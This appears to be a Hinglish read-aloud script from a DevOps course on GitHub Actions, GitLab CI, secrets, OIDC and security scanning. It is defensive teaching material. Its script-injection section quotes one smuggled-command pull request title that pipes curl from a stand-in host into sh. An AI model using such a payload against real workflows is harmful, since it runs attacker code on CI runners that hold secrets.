# 🎙️ 02a: TELEPROMPTER / READ-ALOUD SCRIPT: SESSION-20_github-actions-and-devsecops

*Extracted word-for-word from `02_script.md` by `tools/teleprompter/extract.py` (voiceover prose only; [VISUAL] directives, code fences and metadata removed; markdown stripped). If you edit spoken text, edit the script first, then re-run extraction. `teleprompter/` videos are built from this file.*

**Spoken words:** ~2,799 · **Episodes:** 4

---

# EPISODE 1: Vault ke Andar ki Conveyor

## Foreman ke Bina Conveyor

Jenkins mein humne ek foreman hire kiya, uska daftar chalaya, uske plugins, backup aur workbenches sambhaale. GitHub Actions mein conveyor seedha vault ke andar hi hai. Ek YAML file .github/workflows/ folder mein, aur GitHub aapke liye workbenches chalata hai. Foreman ka daftar aapko nahi sambhalna padta. Chhote aur medium projects ke liye ye bahut sahulat wala hai. Aur ek baar concept samajh gaye, to har CI tool aasaan lagta hai, kyunki Session 17 ke stations aur Jenkinsfile ka dhancha yahin dobara dikhega, bas alag shabdon mein.

## Workflow ke Hisse

Workflow ek YAML file hai. on batata hai kaun si ghatna conveyor chalayegi: push, pull_request, workflow_dispatch jo button se chalta hai, ya schedule jo cron ki tarah chalta hai, aur UTC mein. jobs mein kaam hote hain, aur ye default mein ek saath chalte hain. Har job ke paas runs-on hota hai, yaani kaun si workbench, jaise ubuntu-latest, ek bilkul saaf machine jo job ke baad gayab ho jaati hai. Job ke andar steps ek ke baad ek: ya run se shell command, ya uses se koi taiyaar action, jaise actions/checkout. Jenkins se tulna: Jenkinsfile ki jagah workflow, stage ki jagah job, aur agent ki jagah runner.

## Pehla Workflow

Ek chhoti Python service ki CI:

Push karte hi Actions tab mein run dikhta hai, har step ke log ke saath. Test fail ho to pull request par laal cross aata hai, aur wahi Session 19 jaisa required check ban sakta hai. Ek aur cheez: step ka exit code non-zero ho to job fail. Ye wahi Session 6 ka sabak hai, jo har CI tool ke neeche chalta hai.

## Workbench: Hosted aur Self-hosted

Workbench do tarah ki hoti hain. GitHub-hosted: har job ke liye ek naya saaf machine, jise GitHub chalata hai, aur uske minutes ka hisaab plan ke saath badalta hai, isliye live billing page dekho. Self-hosted: aapki apni building, jaise Session 19 ki private wing wali workbench, jo GitHub se bahar ki taraf jud jaati hai. Ye tab kaam aati hai jab job ko aapke private network tak pahunchna ho, ya khaas hardware chahiye. Par ek chetavni: self-hosted runner ko public repo par kabhi mat chalao. Koi bhi pull request ka code us workbench par chal sakta hai, aur wahan aapke network ki chaabiyan hain.

## Doosra Vault: GitLab CI

Har team GitHub par nahi hoti. GitLab ek aur vault hai jisme conveyor pehle se andar hai, aur uski file ka naam .gitlab-ci.yml hai, repo ki jad mein. Vichar wahi, alfaaz alag. Pehle stages ki list: build, test, deploy. Ek stage ke jobs saath chalte hain, aur stage ek ke baad ek. Har job mein image, yaani kis truck ke andar chalega, aur script, yaani commands ki list. GitHub ke on: ki jagah rules: tay karta hai ki job kab banega, jaise sirf default branch par. needs se job stage ka intezaar kiye bina shuru ho sakta hai. Artifacts aur cache ke wahi do idea. Workbench ko GitLab mein runner kehte hain, aur tags se tay hota hai ki kaunsa runner kaam uthaye. Wahi dhyaan: apna runner public repo par mat lagao. Ek bonus: pages naam ki job public folder ko GitLab Pages par website bana deti hai. Aap kisi bhi vault par ho, pin karna, secrets ko masked variables mein rakhna, aur chhoti conveyor, ye sab sikha hua kaam aata hai. Lab: apni ci.yml ko kaagaz par .gitlab-ci.yml mein likho, aur dekho kaunsa hissa seedha mil jaata hai.

## Action ko Pin Karo

uses: mein aap kisi aur ka code apni conveyor mein bula rahe ho. Isliye usse bharose se bulao. Branch ka naam, jaise @main, kabhi nahi: wo kal kuch bhi ho sakta hai. Tag, jaise @v7, theek hai bharose ke publishers ke liye. Version number badalte rehte hain: jo hum likhte hain wo nawambar 2026 ke hain, aur actions ka releases page dekh kar apna version chuno. Sabse surakshit: poora commit SHA, jaise @3f2a..., jo badal nahi sakta. Tab updates ko haath se mat dhoondho: Dependabot actions ke updates ke pull request khud bana deta hai, jisme SHA aur version dono likhe hote hain. Session 16B ka chief architect un pull requests ko review karke merge karta hai. Aur ek aur niyam: third-party action jo aapke secrets dekhti ho, use pehle padh lo.

## Lab: Apni Conveyor Banao

Lab. Ek chhota repo banao jisme app.py mein ek function ho, jaise nights(check_in, check_out), aur test_app.py mein pytest ke do tests. .github/workflows/ci.yml mein upar wala workflow rakho, aur push karo. Actions tab mein run kholo aur har step ka log dekho. Ab ek test jaan boojh kar tod do, ek branch par, aur pull request kholo. Check laal hoga. Phir branch protection mein ye check required karo, jaise Session 19 mein Jenkins ka check tha, aur dekho ki merge ka button grey ho jaata hai. Test theek karo aur check hara. Ab aapki conveyor vault ke andar hi rehti hai, aur uske badlaav bhi pull request se hote hain.

## Recap aur Bridge

Recap: workflow, job aur step, runner ke do tareeke, aur action ko pin karna. Ab conveyor ko tez aur samajhdar banate hain.

---

# EPISODE 2: Tez aur Samajhdar

## 12 Minute ki Conveyor, Roz 40 Baar

Agar Atithi ki conveyor 12 minute leti hai aur din mein chaalis baar chalti hai, to team ka bahut samay kaam karne ki jagah intezaar mein jaata hai. Aur designer us beech doosra kaam shuru kar deta hai, jo context badalne ka mehnga kaam hai. Teen cheezein conveyor ko tez karti hain: cache, matrix aur concurrency. Aur ek aur jo kaam ko saaf rakhta hai: artifacts. Aaj ye sab.

## Cache: Kal ki Mehnat Aaj Kaam Aaye

Cache mein dependencies ko ek baar download karke save kar lete hain, aur agli run mein wahi se utha lete hain. Key ek hash hoti hai, jaise requirements.txt ki, hashFiles('requirements.txt'). Jab tak file nahi badli, key wahi, aur cache wapas mil jaata hai. File badli to nayi key aur naya download. Aasaan tareeka: actions/setup-python mein cache: pip likh do, to ye sab apne aap hota hai. Ek chetavni: cache sirf speed ke liye hai, sachchai ke liye nahi. Conveyor cache ke bina bhi chalni chahiye, bas dheemi.

## Matrix: Ek Job, Kai Combination

Matrix ek job ko kai combinations par chalata hai. Do operating systems aur teen Python versions, to chhe jobs ek saath. Isse compatibility ek saath pakdi jaati hai: Atithi ki service server par 3.12 par chalegi, par designer ke laptop par 3.11 ho sakta hai. fail-fast ka matlab ek job fail hone par baaki rok do. include aur exclude se kuch combination jodna ya hatana hota hai. Ek ghar ki baat: chhe jobs ka matlab chhe guna minutes ka hisaab, isliye matrix wahi rakho jo sach mein chahiye. Session 18 ke parallel stations ka yahi bada roop hai.

## Concurrency aur Artifacts

Do baar jaldi jaldi push karne par pehli run bekaar hai. concurrency ke group aur cancel-in-progress: true se purani run apne aap cancel ho jaati hai. Ye Jenkins ke disableConcurrentBuilds ka dusra roop hai. Ek job ka natija doosre job ko dena ho, to artifacts: upload-artifact se build job ka finished unit save karo, aur needs: build ke saath deploy job mein download-artifact. if: github.ref == 'refs/heads/main' se deploy sirf master par. Version 4 ke artifacts ke naam har run mein alag hone chahiye, isliye matrix mein naam mein combination jodo. Aur artifacts ki ek meyaad hoti hai, jisse storage ka kharcha bachta hai.

## Reusable Workflow: Binder ka Doosra Roop

Session 18 mein humne dus services ke liye ek shared instruction binder dekha tha. Actions mein iska roop reusable workflow hai. Ek shared repo mein ek workflow on: workflow_call ke saath likhte ho, jo inputs leta hai, jaise Python version. Aur har service ki conveyor sirf chaar line mein use bulati hai: uses: atithi/atithi-workflows/.github/workflows/python-ci.yml@v1. Wahi niyam: version tag lagao, @v1, taaki ek badlaav sab ko ek saath na tode, aur use bhi pull request se review karo. Is tarah nayi service ki conveyor chhoti rehti hai aur standard sab jagah ek jaisa.

## Raat ki Conveyor aur Haath ka Button

Conveyor sirf push par nahi chalti. schedule ke saath cron: '30 20 * * *' roz ek tay samay par chalti hai, jaise raat ka dependency scan, kyunki kal tak jo package theek tha, aaj uski nayi kamzori mil sakti hai. Dhyaan: ye cron UTC mein hai, to 20:30 UTC bharat mein raat ke do bajte hain. Aur workflow_dispatch ek button hai: Actions tab mein "Run workflow" dabao, aur inputs chuno, jaise environment. Isse haath se deploy ya re-run bina nayi commit ke. Ek niyam: scheduled aur manual run bhi usi branch ke workflow se chalte hain, aur schedule sirf default branch par chalta hai.

## Lab: Matrix, Cache aur Artifact

Lab. Pichhli workflow mein strategy: matrix: python: ['3.11','3.12'] jodo, aur python-version: {{ matrix.python }}. setup-python mein cache: pip likho. Ek step mein pytest --junitxml=report.xml, aur upload-artifact mein name: report-{{ matrix.python }}. Ab concurrency ka block bhi jodo. Do baar push karo. Doosri baar log mein "Cache restored" dikhega aur run tez hogi. Ek aur test: jaldi jaldi do push karo aur dekho ki pehli run cancel ho gayi. Aakhir mein run page se artifacts download karke dekho.

## Recap aur Bridge

Recap: cache, matrix, concurrency, artifacts aur reusable workflow. Ab deploy ke liye key cabinet, aur ek tareeka bina chaabi ke andar jaane ka.

---

# EPISODE 3: Key Cabinet aur Bina Chaabi ka Deploy

## Secrets ka Khatra

AWS ki chaabi ko vault ke secrets mein rakhna sahi shuruaat hai, par wo ek lambi chaabi hai. Jab tak koi badle nahi, wo chalti rehti hai, aur leak ho sakti hai. Session 9 ke access keys ka wahi sabak: jitni lambi chaabi, utna bada khatra. Aur Session 19 ki baat yahan bhi sach hai: jo secret hai hi nahi, wo leak nahi ho sakta. Isliye pehle dekhte hain ki secrets ko sahi tareeke se kaise rakhte hain, aur phir ek aisa tareeka jisme chaabi hai hi nahi: OIDC.

## Secrets, Environments aur Token ki Ijaazat

Secrets repository ya environment level par rakhte hain, aur workflow mein ${{ secrets.NAME }} se use karte hain. Log mein GitHub unhe mask karta hai, par Session 19 ki baat yaad rakho: masking ek parda hai, taala nahi. Fork se aane wale pull requests ko secrets nahi milte, jo achha safety feature hai. production jaise environment mein required reviewers lag sakte hain, jisse deploy tabhi chalta hai jab koi insaan haan kahe, aur environment ke secrets sirf us job ko milte hain. Ye suvidha plan par nirbhar hai, isliye dekh lo. Aur workflow ke token ki ijaazat permissions: block se kam rakho, jaise contents: read, taaki bhool se bhi wo zyada na kar sake.

## Script Injection: Title Mein Command

Ek bahut aam galti. Workflow mein run: echo "{{ github.event.pull_request.title }}" likha hai. {{ }} ke andar ki cheez shell chalne se pehle text mein bhar di jaati hai. Agar koi pull request ka title likhe fix"; curl evil.sh | sh; ", to wo title command ban jaata hai aur aapki workbench par chal jaata hai. Ye script injection hai, aur Session 17 ke double quotes ke jaal ka bada bhai. Hal: bahar ke text ko pehle env: mein daalo, aur shell mein "$TITLE" ki tarah use karo, jahan shell use sirf data maanta hai. Aur pull_request_target jaise events se bacho, kyunki wo base repo ke secrets ke saath bahar ka code chala sakte hain.

## OIDC: Duty Badge Bina Chaabi ke

OIDC mein workbench vault se ek chhota identity token maangti hai, use AWS ke saamne rakhti hai, aur AWS dekhta hai ki role ki trust policy ke hisaab se ye repo aur branch ya environment allowed hai ya nahi. Allowed ho to chhota, kuch minute ka credential milta hai, jaise Session 9 ke assume-role mein tha. Koi chaabi vault mein hai hi nahi. Workflow mein permissions: id-token: write aur aws-actions/configure-aws-credentials ke saath role-to-assume. AWS mein ek identity provider token.actions.githubusercontent.com banta hai, aur role ki trust policy mein sub ki shart likhte hain, jaise repo:atithi/rooms-service:ref:refs/heads/main. Dhyaan: GitHub ke naye repos mein sub ke andar owner aur repo ke ID bhi jude hote hain, jaise repo:atithi@123/rooms-service@456:ref:refs/heads/main. Isliye pehle ek chhote debug step se apne run ka asli sub dekho, aur wahi trust policy mein likho, warna AWS Not authorized kahega. Ye shart zaroori hai: bina iske koi bhi repo wo role le sakta hai.

## Secret Leak Ho Gaya: Pehle Kya

Kisi ne galti se key commit kar di. Session 9 ka kram yahan bhi wahi: pehle chaabi band karo, history baad mein. Ek, us chaabi ko turant revoke ya deactivate karo, kyunki jab tak wo push hui, usse ek bot padh chuka ho sakta hai. Do, logs se dekho ki us chaabi se kuch hua ya nahi. Teen, tab history se hatao, git filter-repo ya BFG jaise tool se, aur team ko bolo ki sab dobara clone karein. Chaar, aage ke liye pehra: vault ka secret scanning aur push protection, aur ek pre-commit hook jo commit se pehle hi key pakad le. Seedha sabak: history saaf karne se key wapas safe nahi hoti. Safe tab hoti hai jab wo band ho.

## Lab: Secret, Environment aur Approval

Lab. Repo mein ek secret DEMO_TOKEN banao. Workflow mein env: DEMO_TOKEN: {{ secrets.DEMO_TOKEN }} aur run: echo "length={#DEMO_TOKEN}". Phir ek environment production banao aur khud ko required reviewer rakho. deploy job mein environment: production likho. Run karo: job approval par rukega, aur haan dene ke baad hi chalega. Ek aur step jodo jo pull request ka title env: ke raaste padhe, aur "$TITLE" ki tarah echo kare. Agar aapke paas AWS account hai, to ek OIDC provider aur ek role banao jiski trust policy mein sirf aapka repo ho, aur aws sts get-caller-identity --query UserId --output text chala kar dekho (poora output mat chhapo: usme account number aata hai, aur public repo ke logs sabko dikhte hain). Lab ke baad role aur provider hata do.

## Recap aur Bridge

Recap: secrets, token ki ijaazat, script injection aur OIDC. Ab conveyor mein inspection: DevSecOps.

---

# EPISODE 4: Conveyor mein Inspection

## Security Aakhir mein Kyun?

Purane tareeke mein security team release ke bilkul aakhir mein aati thi. Ek bada issue mila to hafton ki deri, aur sab ek doosre se naraaz. DevSecOps ka matlab hai ki security conveyor ke har station par chhote automatic jaanch ban kar rahe, shuru se. Isse "shift left" kehte hain: problem jitni jaldi pakdi, utni sasti. Aur ek aur faayda: developer ko jawab turant milta hai, usi pull request mein, jab wo kaam abhi uske dimaag mein hai.

## Inspection ki Parten

Paanch parten yaad rakho. Ek: secrets scan, jaise Gitleaks, jo dekhta hai ki kisi ne key ya token commit to nahi kiya. Do: blueprint inspector, yaani SAST, jaise CodeQL ya SonarQube, jo hamare apne code mein galat pattern dhoondhta hai, jaise SQL injection. Teen: dependency scan, yaani SCA, jaise pip-audit aur Dependabot, jo bahar ke packages ki known kamzoriyan dhoondhta hai. Chaar: X-ray, yaani Trivy, jo finished truck design, yaani Docker image, ke andar ke packages jaanchta hai. Paanch: infrastructure code ka scan, jaise Terraform ke liye Checkov, jo hum aage dekhenge. Har tool alag cheez pakadta hai, aur koi ek tool sab kuch nahi karta.

## Pehla Gate: Commit se Pehle

Sabse sasta gate commit se pehle hai. Session 16 ka pre-commit hook yaad hai? Ek hook jo staged files par secrets scan chalaye, jaise gitleaks protect --staged, ya naye version ka gitleaks git --staged, aur secret mile to commit hone hi na de. Ye pehla gate hai, kyunki key commit hone se pehle hi rok li jaati hai, aur history mein kabhi jaati hi nahi. Par hook designer ki apni laptop par hai aur use skip kiya ja sakta hai, --no-verify se. Isliye conveyor dusra gate hai, jise koi skip nahi kar sakta. Dono chahiye: ek jaldi ke liye, ek bharose ke liye.

## Gate Sochkar Lagao: Shor Nahi, Signal

Har finding par build fail karoge, to conveyor roz toot jayegi, aur team use ignore karna seekh legi. Wahi shor wali baat jo Session 15 ke alarm mein thi. Isliye gate sochkar lagao. CRITICAL aur HIGH, jinka fix available hai, un par build fail. Baaki ko report karo aur plan karo. Kuch findings false positive hongi, aur kuch par risk accept karna padega, par uska karan aur samay-seema likhni chahiye, jaise .trivyignore mein comment ke saath. Aur ek aur niyam: security job ko required check banao, warna wo sirf suggestion rehta hai. Aur dependencies ke updates Dependabot khud pull request mein bhej deta hai, to naye version tak pahunchna roz ka chhota kaam rahe, saal ka bada nahi.

## Lab: Security Job

Lab. Workflow mein ek security job jodo. Secrets scan ke liye Gitleaks ka official action. Dependencies ke liye pip install pip-audit && pip-audit -r requirements.txt. Aur Trivy ka filesystem scan: trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .. Ab requirements.txt mein jaan boojh kar ek purana, jaana-maana vulnerable package version rakho, aur dekho ki job fail hoti hai. Report padho: package, kamzori ka ID, aur kis version mein fix hai. Version upgrade karo aur job pass karao. Phir ek pre-commit hook lagao jo gitleaks se staged files dekhe, aur ek nakli key likh kar commit karne ki koshish karo: hook use rok dega. Naye tool versions ke liye unki official docs dekhna.

## Recap aur Bridge

Recap: Git, Jenkins, GitHub Actions aur security gates. Conveyor ab inspection ke saath chalti hai. Par abhi tak conveyor jo finished unit banati hai, wo ek jar ya zip file hai, jise chalane ke liye har server par sahi Java ya Python version chahiye. Ab hum use ek sealed truck mein pack karenge, jo har building ke courtyard mein ek jaisa chalega, aur "mere laptop par to chal raha tha" wali baat hamesha ke liye khatam. Agla session: Docker.
